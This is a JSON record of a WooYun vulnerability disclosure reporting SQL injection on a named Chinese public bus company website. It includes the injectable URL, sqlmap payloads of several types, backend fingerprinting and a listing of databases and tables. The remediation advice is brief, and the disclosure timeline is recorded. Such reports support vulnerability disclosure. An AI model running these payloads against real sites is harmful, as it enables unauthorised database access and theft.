{"id": 42795, "wybug_id": "wooyun-2014-084629", "wybug_title": "南通公交总公司网站存在sql注入", "wybug_corp": "南通公交总公司", "wybug_author": "叶小枫", "wybug_date": "2014-11-25 17:09", "wybug_open_date": "2015-01-09 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向公众公开  简要描述： 南通公交总公司网站存在sql注入。。。。。。 详细说明：  注入点：http://www.ntgjzgs.cn/ic.aspx?id=1314\nPlace: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1314 AND 1117=1117    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=1314 AND 2205=CONVERT(INT,(CHAR(58)+CHAR(105)+CHAR(103)+CHAR(112+(SELECT (CASE WHEN (2205=2205) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(115)+CHAR(111)+CHAR(58)))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=1314; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=1314 WAITFOR DELAY '0:0:5'-----[11:03:07] [INFO] testing MySQL[11:03:07] [WARNING] the back-end DBMS is not MySQL[11:03:07] [INFO] testing Oracle[11:03:07] [WARNING] the back-end DBMS is not Oracle[11:03:07] [INFO] testing PostgreSQL[11:03:07] [WARNING] the back-end DBMS is not PostgreSQL[11:03:07] [INFO] testing Microsoft SQL Server[11:03:07] [INFO] confirming Microsoft SQL Server[11:03:08] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000\n   漏洞证明：  \navailable databases [7]:[*] master[*] model[*] msdb[*] Northwind[*] ntbus[*] pubs[*] tempdb\n\nDatabase: ntbus[13 tables]+------------------------------------------------+| dbo.adminrights                                || dbo.admins                                     || dbo.article                                    || dbo.attach                                     || dbo.dtproperties                               || dbo.gbook                                      || dbo.gbookrep                                   || dbo.modules                                    || dbo.other                                      || dbo.sysconstraints                             || dbo.syssegments                                || dbo.xianlu                                     || dbo.xlbh                                       |+------------------------------------------------+Database: tempdb[2 tables]+------------------------------------------------+| dbo.sysconstraints                             || dbo.syssegments                                |+------------------------------------------------+Database: msdb[82 tables]+------------------------------------------------+| dbo.RTblClassDefs                              || dbo.RTblDBMProps                               || dbo.RTblDBXProps                               || dbo.RTblDTMProps                               || dbo.RTblDTSProps                               || dbo.RTblDatabaseVersion                        || dbo.RTblEQMProps                               || dbo.RTblEnumerationDef                         || dbo.RTblEnumerationValueDef                    || dbo.RTblGENProps                               || dbo.RTblIfaceDefs                              || dbo.RTblIfaceHier                              || dbo.RTblIfaceMem                               || dbo.RTblMDSProps                               || dbo.RTblNamedObj                               || dbo.RTblOLPProps                               || dbo.RTblParameterDef                           || dbo.RTblPropDefs                               || dbo.RTblProps                                  || dbo.RTblRelColDefs                             || dbo.RTblRelshipDefs                            || dbo.RTblRelshipProps                           || dbo.RTblRelships                               || dbo.RTblSIMProps                               || dbo.RTblScriptDefs                             || dbo.RTblSites                                  || dbo.RTblSumInfo                                || dbo.RTblTFMProps                               || dbo.RTblTypeInfo                               || dbo.RTblTypeLibs                               || dbo.RTblUMLProps                               || dbo.RTblUMXProps                               || dbo.RTblVersionAdminInfo                       || dbo.RTblVersions                               || dbo.RTblWorkspaceItems                         || dbo.backupfile                                 || dbo.backupmediafamily                          || dbo.backupmediaset                             || dbo.backupset                                  || dbo.log_shipping_databases                     || dbo.log_shipping_monitor                       || dbo.log_shipping_plan_databases                || dbo.log_shipping_plan_history                  || dbo.log_shipping_plans                         || dbo.log_shipping_primaries                     || dbo.log_shipping_secondaries                   || dbo.logmarkhistory                             || dbo.mswebtasks                                 || dbo.restorefile                                || dbo.restorefilegroup                           || dbo.restorehistory                             || dbo.sqlagent_info                              || dbo.sysalerts                                  || dbo.syscachedcredentials                       || dbo.syscategories                              || dbo.sysconstraints                             || dbo.sysdbmaintplan_databases                   || dbo.sysdbmaintplan_history                     || dbo.sysdbmaintplan_jobs                        || dbo.sysdbmaintplans                            || dbo.sysdownloadlist                            || dbo.sysdtscategories                           || dbo.sysdtspackagelog                           || dbo.sysdtspackages                             || dbo.sysdtssteplog                              || dbo.sysdtstasklog                              || dbo.sysjobhistory                              || dbo.sysjobs                                    || dbo.sysjobs_view                               || dbo.sysjobschedules                            || dbo.sysjobservers                              || dbo.sysjobsteps                                || dbo.sysnotifications                           || dbo.sysoperators                               || dbo.syssegments                                || dbo.systargetservergroupmembers                || dbo.systargetservergroups                      || dbo.systargetservers                           || dbo.systargetservers_view                      || dbo.systaskids                                 || dbo.systasks                                   || dbo.systasks_view                              |+------------------------------------------------+Database: pubs[14 tables]+------------------------------------------------+| dbo.authors                                    || dbo.discounts                                  || dbo.employee                                   || dbo.jobs                                       || dbo.pub_info                                   || dbo.publishers                                 || dbo.roysched                                   || dbo.sales                                      || dbo.stores                                     || dbo.sysconstraints                             || dbo.syssegments                                || dbo.titleauthor                                || dbo.titles                                     || dbo.titleview                                  |+------------------------------------------------+Database: master[36 tables]+------------------------------------------------+| dbo.INFORMATION_SCHEMA.CHECK_CONSTRAINTS       || dbo.INFORMATION_SCHEMA.COLUMNS                 || dbo.INFORMATION_SCHEMA.COLUMN_DOMAIN_USAGE     || dbo.INFORMATION_SCHEMA.COLUMN_PRIVILEGES       || dbo.INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE || dbo.INFORMATION_SCHEMA.CONSTRAINT_TABLE_USAGE  || dbo.INFORMATION_SCHEMA.DOMAINS                 || dbo.INFORMATION_SCHEMA.DOMAIN_CONSTRAINTS      || dbo.INFORMATION_SCHEMA.KEY_COLUMN_USAGE        || dbo.INFORMATION_SCHEMA.PARAMETERS              || dbo.INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS || dbo.INFORMATION_SCHEMA.ROUTINES                || dbo.INFORMATION_SCHEMA.ROUTINE_COLUMNS         || dbo.INFORMATION_SCHEMA.SCHEMATA                || dbo.INFORMATION_SCHEMA.TABLES                  || dbo.INFORMATION_SCHEMA.TABLE_CONSTRAINTS       || dbo.INFORMATION_SCHEMA.TABLE_PRIVILEGES        || dbo.INFORMATION_SCHEMA.VIEWS                   || dbo.INFORMATION_SCHEMA.VIEW_COLUMN_USAGE       || dbo.INFORMATION_SCHEMA.VIEW_TABLE_USAGE        || dbo.MSreplication_options                      || dbo.spt_datatype_info                          || dbo.spt_datatype_info_ext                      || dbo.spt_fallback_db                            || dbo.spt_fallback_dev                           || dbo.spt_fallback_usg                           || dbo.spt_monitor                                || dbo.spt_provider_types                         || dbo.spt_server_info                            || dbo.spt_values                                 || dbo.sysconstraints                             || dbo.syslogins                                  || dbo.sysoledbusers                              || dbo.sysopentapes                               || dbo.sysremotelogins                            || dbo.syssegments                                |+------------------------------------------------+Database: Northwind[31 tables]+------------------------------------------------+| dbo.Categories                                 || dbo.CustomerCustomerDemo                       || dbo.CustomerDemographics                       || dbo.Customers                                  || dbo.EmployeeTerritories                        || dbo.Employees                                  || dbo.Invoices                                   || dbo.Orders                                     || dbo.Products                                   || dbo.Region                                     || dbo.Shippers                                   || dbo.Suppliers                                  || dbo.Territories                                || dbo.[Alphabetical list of products]            || dbo.[Category Sales for 1997]                  || dbo.[Current Product List]                     || dbo.[Customer and Suppliers by City]           || dbo.[Order Details Extended]                   || dbo.[Order Details]                            || dbo.[Order Subtotals]                          || dbo.[Orders Qry]                               || dbo.[Product Sales for 1997]                   || dbo.[Products Above Average Price]             || dbo.[Products by Category]                     || dbo.[Quarterly Orders]                         || dbo.[Sales Totals by Amount]                   || dbo.[Sales by Category]                        || dbo.[Summary of Sales by Quarter]              || dbo.[Summary of Sales by Year]                 || dbo.sysconstraints                             || dbo.syssegments                                |+------------------------------------------------+\n   修复方案：  过滤参数   版权声明：转载请注明来源 叶小枫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-28 18:08 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}